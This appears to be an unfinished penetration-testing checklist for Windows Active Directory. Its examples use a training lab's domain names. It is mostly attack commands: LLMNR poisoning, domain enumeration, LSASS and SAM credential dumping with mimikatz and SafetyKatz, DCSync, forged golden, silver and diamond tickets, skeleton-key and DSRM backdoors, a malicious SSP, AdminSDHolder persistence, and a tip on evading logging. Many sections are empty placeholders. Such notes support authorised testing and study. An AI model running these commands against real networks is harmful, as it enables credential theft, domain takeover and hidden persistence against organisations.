# Network Pentesting
--- 
## Unauthenticated Testing
### Recon
- [ ] Work out where we are

```bash
nslookup localhost
```

- [ ] Listen to network traffic passively

	=== "Linux"
	
		```bash
		sudo tcpdump -i [interface] -s 65535 -w sound.pcap port not 22
		```

		```bash
		nmap --script broadcast-dhcp-discover
		```
	
	=== "Windows"
	
		```powershell
		netsh trace start capture=yes tracefile=c:\windows\tasks\output.etl
		```
		
		```powershell
		netsh trace stop
		```

- [ ] Check NTB-NS

	```bash
	# Name lookup on a range
	nbtscan -r $SUBNET/$MASK
	
	# Find names and workgroup from an IP address
	nmblookup -A $IPAdress
	```

	![](../../../../../assets/screenshots/Pasted%20image%2020250518111327.png)

- [ ] Check LDAP

	=== "Linux"
	
		```bash
		# remotely dump information 
		ldeep ldap -u "$USER" -p "$PASSWORD" -d "$DOMAIN" -s ldap://"$DC_IP" all "ldeepdump/$DOMAIN"
		
		# parse saved information (in this case, enumerate trusts)
		ldeep cache -d "ldeepdump" -p "$DOMAIN" trusts
		
		# list naming contexts
		ldapsearch -h "$DC_IP" -x -s base namingcontexts
		ldapsearch -H "ldap://$DC_IP" -x -s base namingcontexts
		
		# enumerate info in a base (e.g. naming context = DC=DOMAIN,DC=LOCAL)
		ldapsearch -h "$DC_IP" -x -b "DC=DOMAIN,DC=LOCAL"
		ldapsearch -H "ldap://$TARGET" -x -b "DC=DOMAIN,DC=LOCAL"
		```
	
	=== "Windows"
	
		```powershell
		placeholder
		```

### Poisoning
- [ ] Run responder in analyze mode
	- Look for LLMNR, NBNS, MDNS
	- Look for any other interesting requests

		```bash
		sudo responder -I $INTERFACE -A
		```

- [ ] Perform LLMNR/NBT-NS Poisoning

	=== "Linux"
	
		```bash
		sudo responder -I $INTERFACE -A
		```
	
	=== "Windows"
	
		```powershell
		Import-Module .\Inveigh.ps1
		```
		
		```powershell
		Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
		```
		
		!!! tip "Disable NBT-NS"
		
			The following can be used to disable NBT-NS on Windows
			
			`$regkey = "HKLM:SYSTEM\CurrentControlSet\services\NetBT\Parameters\Interfaces" Get-ChildItem $regkey |foreach { Set-ItemProperty -Path "$regkey\$($_.pschildname)" -Name NetbiosOptions -Value 2 -Verbose}`

## Domain Enumeration

### Domain Configuration

- [ ] Get Current domain

	=== "Linux"
		```bash
		something
		```
	=== "Windows"
		```powershell
		Get-Domain
		```
		
		```powershell
		Get-ADDomain
		```
	
		```powershell
		Get-Domain -Domain test.local
		```
	
		```powershell
		Get-ADDomain -Identity test.local
		```

- [ ] Get Domain SID for the current domain

	=== "Linux"
		```bash
		placeholder
		```
	
	=== "Windows"
	
		```powershell
		Get-DomainSID
		```
		
		```powershell
		(Get-ADDomain).DomainSID
		```

- [ ] Get domain policy

	=== "Linux"
	
		```bash
		nxc smb $TARGET -u '' -p '' --pass-pol
		```
	
	=== "Windows"
	
		```powershell
		Get-DomainPolicyData
		```
		
		```powershell
		(Get-DomainPolicyData).systemaccess
		```
		
		Get domain policy for another domain
		
		```powershell
		(Get-DomainPolicyData -domain example.local).systemaccess
		```
	
- [ ] Locate DCs

	=== "Nslookup"
		Using nslookup
	
		```bash
		# find the PDC (Principal Domain Controller)
		nslookup -type=srv _ldap._tcp.pdc._msdcs.$FQDN_DOMAIN
		
		# find the DCs (Domain Controllers)
		nslookup -type=srv _ldap._tcp.dc._msdcs.$FQDN_DOMAIN
		
		# find the GC (Global Catalog, i.e. DC with extended data)
		nslookup -type=srv gc._msdcs.$FQDN_DOMAIN
		
		# Other ways to find services hosts that may be DCs 
		nslookup -type=srv _kerberos._tcp.$FQDN_DOMAIN
		nslookup -type=srv _kpasswd._tcp.$FQDN_DOMAIN
		nslookup -type=srv _ldap._tcp.$FQDN_DOMAIN
		```

	=== "NetExec"

		```
		netexec ldap $TARGET -u '' -p '' --dc-list
		```

	=== "Pywerview"

		```bash
		pywerview get-netdomaincontroller -u 'user' -p 'password' -t $DCFQDN 
		```

	
	=== "Windows"
	
		```powershell
		Get-DomainController [-Domain example.local]
		```

		```powershell
		Get-ADDomainController [-DomainName example.local]
		```

### User Enumeration

- [ ] Get a list of users

	=== "Linux"
		
		```bash
		nxc ldap $TARGET -u 'user' -p 'password' --users
		```
		
		```bash
		ldeep ldap
		```
		
		```bash
		pywerview 
		```
	
	=== "Windows"
	
		```powershell
		Get-DomainUser
		```
	
		```powershell
		Get-ADUser -Filter * -Properties *
		```

		Get all properties for users in the current domain
		
		```powershell
		Get-DomainUser -Identity $name -Properties *
		```

		```powershell
		Get-ADUser -Filter * -Properties *| select Samaccountname,Description
		```

		```powershell
		Get-ADUser -Filter * -Properties * | select name,logoncount,@{expression={[datetime]::fromFileTime($_.pwdlastset )}} AlteredSecuri
		```

		Search for a particular string in user attributes
		
		```powershell
		Get-DomainUser -LDAPFilter "Description=*built*" | Select name,Description
		```

		```powershell
		Get-ADUser -Filter 'Description -like "*built*"' - Properties Description | select name,Description
		```

- [ ] Check for local admin privileges

	=== "Linux" 
	
		```bash
		placeholder
		```
	
	=== "Windows"
	
		```powershell
		placeholder
		```

	!!! tip "If you have admin privileges"
	
		Check for logged in users

- [ ] Check for logged in users

	=== "Linux"
	
		```bash
		placeholder
		```
	
	=== "Windows"
	
		```powershell
		Get-NetLoggedon -ComputerName dcorp-adminsrv
		```
		
		Get local logged in users
		
		```powershell
		Get-LoggedonLocal -ComputerName dcorp-adminsrv
		```
		
		Get the last logged in user
		
		```powershell
		Get-LastLoggedOn -ComputerName dcorp-adminsrv
		```

### Domain Group Enumeration

- [ ] Get a list of domain groups

	=== "Linux" 
	
		```bash
		something
		```
	
	=== "Windows"
		
		```powershell
		Get-DomainGroup
		```
		
		Get details of a specific group
		```powershell
		Get-DomainGroup -Identity "Domain Admins"
		```

		```powershell
		Get-DomainGroup -Domain $TARGETDOMAIN
		```

		```powershell
		Get-ADGroup -Filter * | select Name
		```
		
		```powershell
		Get-ADGroup -Filter * -Properties *
		```

		Get groups containing the word "admin"
		
		```powershell
		Get-DomainGroup *admin*
		```
		
		```powershell
		Get-ADGroup -Filter 'Name -like "*admin*"' | select Name
		```

- [ ] Get group membership

	=== "Linux"
	
		```bash
		placeholder
		```
	
	=== "Windows"
	
		```powershell
		Get-DomainGroupMember -Identity "Domain Admins" -Recurse
		```
		
		```powershell
		Get-ADGroupMember -Identity "Domain Admins" -Recursive
		```

- [ ] List all the local groups on a machine

	=== "Linux"
	
		```bash
		placeholder
		```
	
	=== "Windows"
	
		```powershell
		Get-NetLocalGroup -ComputerName dcorp-dc
		```
		
		Get members of a specific group
		
		```powershell
		Get-NetLocalGroupMember -ComputerName dcorp-dc -GroupName Administrators
		```

### Domain Computer Enumeration

- [ ] Get a list of domain computer objects

	=== "Linux"
	
		```bash
		placeholder
		```
	
	=== "Windows - PowerView"
	
		```powershell
		Get-DomainComputer | select -ExpandProperty dnshostname
		```
	
		```powershell
		Get-DomainComputer -OperatingSystem "*Server 2022*"
		```
		
		```powershell
		Get-DomainComputer -Ping
		```
	
	=== "Windows - AD Module"
	
		```powershell
		Get-ADComputer -Filter * | select Name
		```
		
		```powershell
		Get-ADComputer -Filter * -Properties *
		```
		
		```powershell
		Get-ADComputer -Filter 'OperatingSystem -like "*Server 2022*"' - Properties OperatingSystem | select Name,OperatingSystem
		```
		
		```powershell
		Get-ADComputer -Filter * -Properties DNSHostName | %{TestConnection -Count 1 -ComputerName $_.DNSHostName}
		```


### Domain Shares Enumeration

- [ ] Identify all accessible shares

	=== "Linux"
	
		```bash
		nxc smb smb_enabled_hosts.txt -u 'user' -p 'password' --shares
		```

		```bash
		nxc smb smb_enabled_hosts.txt -u 'user' -p 'password' --shares --filter-shares READ WRITE
		```
	
	=== "Windows"
	
		```powershell
		Invoke-ShareFinder -Verbose
		```
		
		```powershell
		Invoke-FileFinder -Verbose
		```
		
		```powershell
		Get-NetFileServer
		```

	!!! tip "PowerHuntShares"
		[GitHub Link](https://github.com/NetSPI/PowerHuntShares)
		```
		Invoke-HuntSMBShares -NoPing -OutputDirectory C:\AD\Tools -HostList C:\AD\Tools\servers.txt
		```

- [ ] Spider SMB shares

	```bash
	nxc smb $TARGET -u 'user' -p 'password' -M spider_shares
	```

- [ ] Search for interesting files

	=== "Linux"
	
		!!! tip "Manspider"
			The previous method is no longer maintained. The recommended method is now using Docker
		
			```bash
			docker run --rm -v ./manspider:/root/.manspider blacklanternsecurity/manspider --help
			```

		Search for files that may contain creds
		```bash
		manspider smb_enabled_hosts.txt -f passw user admin account network login logon -d evilcorp -u 'user' -p 'password'
		```

		Search for files with "password" in the name
		```bash
		manspider smb_enabled_hosts.txt -f passw -e xlsx csv -d evilcorp -u 'user' -p 'password'
		```
### ACL Enumeration

- [ ] Get ACLs for a given object

	=== "Linux"
	
		```
		something
		```
	
	=== "Windows - PowerView"
	
		```powershell
		Get-DomainObjectAcl -SamAccountName student1 -ResolveGUIDs
		```
		
		Specify a prefix to be used for search
		
		```powershell
		Get-DomainObjectAcl -SearchBase "LDAP://CN=Domain Admins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local" -ResolveGUIDs - Verbose
		```
		
		Identify interesting ACEs
		
		```powershell
		Find-InterestingDomainAcl -ResolveGUIDs
		```
		
		Get the ACLs for a path
		
		```powershell
		Get-PathAcl -Path "\\dcorp-dc.dollarcorp.moneycorp.local\sysvol"
		```
	
	=== "Windows - AD Module"
	
		```powershell
		(Get-Acl 'AD:\CN=Administrator,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local') .Access
		```


### Domain GPO Enumeration

!!! tip "GPO"

	A GPO is a virtual collection of policy settings, security permissions, and scope of management (SOM) that you can apply to users and computers.

- [ ] Get the list of GPOs in the current domain

	=== "Linux"
	
		```bash
		something
		```
	
	=== "Windows - PowerView"
	
		```powershell
		Get-DomainGPO
		```
		
		```powershell
		Get-DomainGPO -ComputerIdentity dcorp-student1
		```
		
		Get GPOs which use restricted groups or groups.xml for interesting users
		
		```powershell
		Get-DomainGPOLocalGroup
		```
		
		Get users in a local group of a machine using GPO
		
		```powershell
		Get-DomainGPOComputerLocalGroupMapping -ComputerIdentity dcorp-student1
		```
		
		Get machines where the given user is a member of a specific group
		
		```powershell
		Get-DomainGPOUserLocalGroupMapping -Identity student1 -Verbose
		```


### OU Enumeration

=== "Linux"

	```bash
	something
	```

=== "Windows - PowerView"

	```powershell
	Get-DomainOU
	```
	
	Get GPO applied on an OU
	
	```powershell
	Get-DomainGPO -Identity "{0D1CC23D-1F20-4EEE-AF64- D99597AE2A6E}"
	```


=== "Windows - AD Module"

	```powershell
	Get-ADOrganizationalUnit -Filter * -Properties *
	```

### Domain Trust Enumeration

- [ ] Map domain trusts

	=== "Linux"
	
		```bash
		something
		```
	
	=== "Windows - PowerView"
	
		Get the trusts for the current domain
		
		```powershell
		Get-DomainTrust
		```
		
		Specify a domain
		
		```powershell
		Get-DomainTrust -Domain us.dollarcorp.moneycorp.local
		```
	
	
	=== "Windows - AD Module"
	
		```powershell
		Get-ADTrust
		```
		
		```powershell
		Get-ADTrust -Identity us.dollarcorp.moneycorp.local
		```


- [ ] Map forest trusts

	=== "Linux" 
	
		```bash
		something
		```
	
	=== "Windows"
	
		Get details about the current forest
		
		```powershell
		Get-Forest
		```
		
		```powershell
		Get-Forest -Forest eurocorp.local
		```
		
		```powershell
		Get-ADForest
		```
		
		```powershell
		Get-ADForest -Identity eurocorp.local
		```
		
		Get all domains in the current forest
		
		```powershell
		Get-ForestDomain
		```
		
		```powershell
		Get-ForestDomain -Forest eurocorp.local
		```
		
		```powershell
		(Get-ADForest).Domains
		```
		
		Get all global catalogs for the current forest
		
		```powershell
		Get-ForestGlobalCatalog
		```
		
		```powershell
		Get-ForestGlobalCatalog -Forest eurocorp.local
		```
		
		```powershell
		Get-ADForest | select -ExpandProperty GlobalCatalogs
		```
		
		Map trusts of a forest
		
		```powershell
		Get-ForestTrust
		```
		
		```powershell
		Get-ForestTrust -Forest eurocorp.local
		```
		
		```powershell
		Get-ADTrust -Filter 'msDS-TrustForestTrustInfo -ne "$null"'
		```


### User Hunting

- [ ] Find all machines in the current domain where the current user has local admin access

	```powershell
	Find-LocalAdminAccess -Verbose
	```

- [ ] Find computers where a domain admin has sessions (another group can also be specified)

	```powershell
	Find-DomainUserLocation -Verbose
	```
	
	```powershell
	Find-DomainUserLocation -UserGroupIdentity "RDPUsers"
	```

- [ ] Find computers where a domain admin session is available **AND** the current user has local admin access

	```powershell
	Find-DomainUserLocation -CheckAccess
	```

- [ ] Find computers where a domain admin session is available

	!!! tip "Stealth"
	
		This will look for file servers and distributed file servers
	
	```powershell
	Find-DomainUserLocation -Stealth
	```

- [ ] List sessions on remote machines

	```powershell
	Invoke-SessionHunter -FailSafe
	```

	[Invoke-SessionHunter - GitHub](https://github.com/Leo4j/Invoke-SessionHunter)


## Local Privilege Escalation

!!! warning "Windows Privilege Escalation"

	There are various ways of locally escalating privileges on Windows box: 
		
	❌ Missing patches 
	
	❌ Automated deployment and AutoLogon passwords in clear text 
	
	❌ AlwaysInstallElevated (Any user can run MSI as SYSTEM) 
	
	❌ Misconfigured Services 
	
	❌ DLL Hijacking and more 
	
	❌ Kerberos and NTLM Relaying


### Tools

[PowerUp](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc)

[PrivEscCheck](https://github.com/itm4n/PrivescCheck)

[WinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)

### Escalation

=== "PowerUp"

	Get unquoted service paths
	
	```powershell
	Get-ServiceUnquoted -Verbose
	```
	
	Find services where the current user can write to the binary path or change arguments to the binary
	
	```powershell
	Get-ModifiableServiceFile -Verbose
	```
	
	Get the services whose configurations the current user can modify
	
	```powershell
	Get-ModifiableService -Verbose
	```
	
	Run all checks
	
	```powershell
	Invoke-AllChecks
	```

=== "PrivescCheck"

	Run all checks

	```powershell
	Invoke-PrivEscCheck
	```

=== "WinPEAS"

	Run all checks

	```powershell
	winPEASx64.exe
	```


## Admin Recon

🚧 Under construction

## Lateral Movement

### PowerShell Remoting

=== "Windows"

	Execute commands or scriptblocks
	
	```powershell
	Invoke-Command -Scriptblock {Get-Process} -ComputerName (Get-Content $LIST_OF_SERVERS)
	```
	
	Execute scripts from files
	
	```powershell
	Invoke-Command -FilePath C:\scripts\Get-PassHashes.ps1 - ComputerName (Get-Content $LIST_OF_SERVERS)
	```
	
	Execute locally loaded function on the remote machine
	
	```powershell
	Invoke-Command -ScriptBlock ${function:Get-PassHashes} - ComputerName (Get-Content $LIST_OF_SERVERS)
	```
	
	Pass in positional arguments
	
	```powershell
	Invoke-Command -ScriptBlock ${function:Get-PassHashes} - ComputerName (Get-Content $LIST_OF_SERVERS) - ArgumentList
	```
	
	Execute stateful commands
	
	```powershell
	$Sess = New-PSSession -Computername Server1 
	Invoke-Command -Session $Sess -ScriptBlock {$Proc = GetProcess} 
	Invoke-Command -Session $Sess -ScriptBlock {$Proc.Name}
	```
	
	Use `winrs` to evade logging
	
	```powershell
	winrs -remote:server1 -u:server1\administrator - p:Pass@1234 hostname
	```

### Credential extraction

#### LSASS

!!! info "LSA"

	Local Security Authority (LSA) is responsible for authentication on a Windows machine. Local Security Authority Subsystem Service (LSASS) is its service.

	Credentials are stored by LSASS when a user: 
	
	✅ Logs on to a local session or RDP 
	
	✅ Uses RunAs 
	
	✅ Run a Windows service 
	
	✅ Runs a scheduled task or batch job 
	
	✅ Uses a Remote Administration tool

	Certain types of credentials can be extracted without touching LSASS (one of the most heavily monitored Windows processes):

	🔑 SAM hive (Registry) - Local credentials 
	
	🔑 LSA Secrets/SECURITY hive (Registry) - Service account passwords, Domain cached credentials etc. 
	
	🔑 DPAPI Protected Credentials (Disk) - Credentials Manager/Vault, Browser Cookies, Certificates, Azure Tokens etc.

=== "Linux"

	Dump the SAM hive
	
	```bash
	nxc smb $TARGET -u "$USER" -p "$PASSWORD" --sam
	```
	
	Dump LSA secrets
	
	```bash
	nxc smb $TARGET -u "$USER" -p "$PASSWORD" --lsa
	```

=== "Mimikatz"

	Dump credentials from LSASS
	
	```powershell
	mimikatz.exe -Command '"sekurlsa::ekeys"'
	```
	
	Use safetykatz for a minidump to use with offline mimikatz
	
	```powershell
	SafetyKatz.exe "sekurlsa::ekeys"
	```
	
	Overpass-the-hash with safetykatz
	
	```powershell
	SafetyKatz.exe "sekurlsa::pth /user:administrator /domain: dollarcorp.moneycorp.local /aes256: /run:cmd.exe" "exit"
	```
	
	OPTH with rubeus
	
	```powershell
	Rubeus.exe asktgt /user:administrator /rc4: /ptt
	```
	
	```powershell
	Rubeus.exe asktgt /user:administrator /aes256: /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
	```

### DCSync

=== "Linux"

	```bash
	something
	```

=== "Mimikatz"

	SafetyKatz

	```powershell
	SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
	```


## Post-DA

!!! alert "Keep going"

	Once we have DA privileges, escalation to EA opens up other attacks! 

### Persistence Mechanisms

=== "Golden Ticket"

	=== "Linux"
	
		```bash
		something
		```
	
	=== "Windows"
	
		Get the KRBTGT hash
		
		```powershell
		C:\AD\Tools\SafetyKatz.exe '"lsadump::lsa /patch"'
		```
		
		Get the AES hash
		
		```powershell
		C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
		```
		
		Forge a golden ticket with attributes similar to a normal TGT
		
		```powershell
		Rubeus.exe golden /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /printcmd
		```
		
		```powershell
		Rubeus.exe golden /aes256:154CB6624B1D859F7080A6615ADC488F09F92843879B3D914CBCB5A8C3CDA84 8 /user:Administrator /id:500 /pgid:513 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948- 3917688648 /pwdlastset:"11/11/2022 6:33:55 AM" /minpassage:1 /logoncount:2453 /netbios:dcorp /groups:544,512,520,513 /dc:DCORPDC.dollarcorp.moneycorp.local /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD /ptt
		```

=== "Silver Ticket"

	=== "Linux"
	
		```bash
		something
		```
	
	=== "Windows"
	
		```powershell
		C:\AD\Tools\Rubeus.exe silver /service:http/dcorpdc.dollarcorp.moneycorp.local /rc4:6e58e06e07588123319fe02feeab775d /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt
		```

=== "Diamond Ticket"

	=== "Linux"
	
		```bash
		something
		```
	
	=== "Windows"
	
		Create a diamond ticket with AES key
		
		```
		Rubeus.exe diamond /krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /user:studentx /password:StudentxPassword /enctype:aes /ticketuser:administrator /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
		```
		
		Using `tgtdeleg`
		
		```powershell
		Rubeus.exe diamond /krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /tgtdeleg /enctype:aes /ticketuser:administrator /domain:dollarcorp.moneycorp.local /dc:dcorpdc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
		```
		

=== "Skeleton Key"

	!!! danger "Maybe think about not using this"
	
		Skeleton key is a persistence technique where it is possible to patch a Domain Controller (lsass process) so that it allows access as any user with a single password.
	
		Not opsec safe and has been known to cause issues with AD CS.
	
		**NOT PERSISTENT ACROSS REBOOTS**
	
	=== "Mimikatz"
	
	Inject a skeleton key (DA privs required)
	
	```powershell
	SafetyKatz.exe '"privilege::debug" "misc::skeleton"' - ComputerName dcorp-dc.dollarcorp.moneycorp.local
	```

	Bypass LSASS running as a protected process

	```powershell
	mimikatz # privilege::debug 
	mimikatz # !+ 
	mimikatz # !processprotect /process:lsass.exe /remove 
	mimikatz # misc::skeleton mimikatz # !-
	```

=== "DSRM"

	!!! info "Directory Services Restore Mode"
	
		There is a local administrator on every DC called "Administrator" whose password is the DSRM password.
	
	=== "Linux"
	
		```bash
		something
		```
	
	=== "Windows"
	
		Dump DSRM password
		
		```powershell
		SafetyKatz.exe "token::elevate" "lsadump::sam"
		```
		
		Compare the administrator hashes -- first one is the DSRM password
		
		```powershell
		SafetyKatz.exe "lsadump::lsa /patch"
		```
		
		Change the logon behavior of the DSRM account before passing the hash
		
		```powershell
		winrs -r:dcorp-dc cmd
		
		# Modify the registry
		reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v "DsrmAdminLogonBehavior" /t REG_DWORD /d 2 /f
		```

		Pass the hash of the DSRM administrator and access the DC
		
		```powershell
		SafetyKatz.exe "sekurlsa::pth /domain:dcorp-dc /user:Administrator /ntlm:a102ad5753f4c441e3af31c97fad86fd /run:powershell.exe"
		```
		
		```powershell
		Set-Item WSMan:\localhost\Client\TrustedHosts $DC_IP
		```
		
		```powershell
		Enter-PSSession -ComputerName $DC_IP -Authentication NegotiateWithImplicitCredential
		```

=== "Custom SSP"

	!!! tip "Security Support Provider"
	
		An SSP is a DLL which provides ways for an application to obtain an authenticated session
	
	Drop mimilib
	
	```powershell
	$packages = Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages'| select -ExpandProperty 'Security Packages' $packages += "mimilib" Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages' -Value $packages Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\ -Name 'Security Packages' -Value $packages
	```
	
	Inject into lsass
	
	```powershell
	SafetyKatz.exe -Command '"misc::memssp"'
	```
	
	!!! danger "Warning for Server 2019 and Server 2022"
	
		This isn't super stable on 2019 and 2022 -- be careful!

### Persistence via ACL

#### Protected Groups

- Account Operators 
- Enterprise Admins 
- Backup Operators 
- Domain Controllers 
- Server Operators 
- Read-only Domain Controllers 
- Print Operators 
- Schema Admins 
- Domain Admins 
- Administrators 
- Replicator

!!! tip "Protected users"

	Well known abuse of some of the Protected Groups - All of the below can log on locally to DC

	- Account Operators - Cannot modify DA/EA/BA groups. Can modify nested group within these groups.
	- Backup Operators - Backup GPO, edit to add SID of controlled account to a privileged group and Restore.
	- Server Operators - Run a command as system (using the disabled Browser service)
	- Print Operators - Copy ntds.dit backup, load device drivers.

=== "AdminSDHolder"

	!!! info "AdminSDHolder"
	
		With DA privileges (Full Control/Write permissions) on the AdminSDHolder object, it can be used as a backdoor/persistence mechanism by adding a user with Full Permissions (or other interesting permissions) to the AdminSDHolder object.
	
	=== "Linux"
	
		```bash
		something
		```
	
	=== "Windows"
	
		Add full control permissions for a user to the AdminSDHolder
		
		```powershell
		Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dcdollarcorp,dc=moneycorp,dc=local' -PrincipalIdentity student1 - Rights All -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
		```
		
		Using AD Module and RACE toolkit
		
		```powershell
		Set-DCPermissions -Method AdminSDHolder -SAMAccountName student1 - Right GenericAll -DistinguishedName 'CN=AdminSDHolder,CN=System,DC=dollarcorp,DC=moneycorp,DC=local' - Verbose
		```
		
		Other interesting permissions
		
		```powershell
		Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dc=dollarcorp,dc=moneycorp,dc=loc al' -PrincipalIdentity student1 -Rights ResetPassword - PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
		```
		
		```powershell
		Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dcdollarcorp,dc=moneycorp,dc=local' -PrincipalIdentity student1 -Rights WriteMembers -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
		```
		
		Run SDProp
		
		```powershell
		Invoke-SDPropagator -timeoutMinutes 1 -showProgress - Verbose
		```
		
		For pre-Server 2008 machines
		
		```powershell
		Invoke-SDPropagator -taskname FixUpInheritance - timeoutMinutes 1 -showProgress -Verbose
		```
		
		Check domain admins permissions
		
		```powershell
		Get-DomainObjectAcl -Identity 'Domain Admins' - ResolveGUIDs | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match "student1"}
		```
		
		Using AD Module
		
		```powershell
		(Get-Acl -Path 'AD:\CN=Domain Admins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local').Ac cess | ?{$_.IdentityReference -match 'student1'}
		```
		
		Abusing full control using PowerView
		
		```powershell
		Add-DomainGroupMember -Identity 'Domain Admins' -Members testda -Verbose
		```
		
		Using AD Module
		
		```powershell
		Add-ADGroupMember -Identity 'Domain Admins' -Members testda
		```
		
		Abusing ResetPassword - PowerView
		
		```powershell
		Set-DomainUserPassword -Identity testda -AccountPassword (ConvertTo-SecureString "Password@123" -AsPlainText - Force) -Verbose
		```
		
		With AD Module
		
		```powershell
		Set-ADAccountPassword -Identity testda -NewPassword (ConvertTo-SecureString "Password@123" -AsPlainText - Force) -Verbose
		```
	
=== "Rights Abuse"

	- [ ] Add full control rights

	=== "Linux"
	
		```bash
		something
		```
	
	=== "Windows"
	
		```powershell
		Add-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalIdentity student1 -Rights All -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
		```

		```powershell
		Set-ADACL -SamAccountName studentuser1 -DistinguishedName 'DC=dollarcorp,DC=moneycorp,DC=local' -Right GenericAll -Verbose
		```

	- [ ] Add rights for DCSync

	=== "Linux"
	
		```bash
		something
		```
	
	=== "Windows"
	
		```powershell
		Add-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalIdentity student1 -Rights DCSync -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
		```
		
		```powershell
		Set-ADACL -SamAccountName studentuser1 -DistinguishedName 'DC=dollarcorp,DC=moneycorp,DC=local' -GUIDRight DCSync -Verbose
		```

	- [ ] Perform DCSync

	=== "Linux"
	
		```bash
		something
		```
	
	=== "Windows"
	
		```powershell
		Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
		```
		
		```powershell
		SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
		```

=== "Security Descriptors"

	something else
## Cross-Trust Attacks

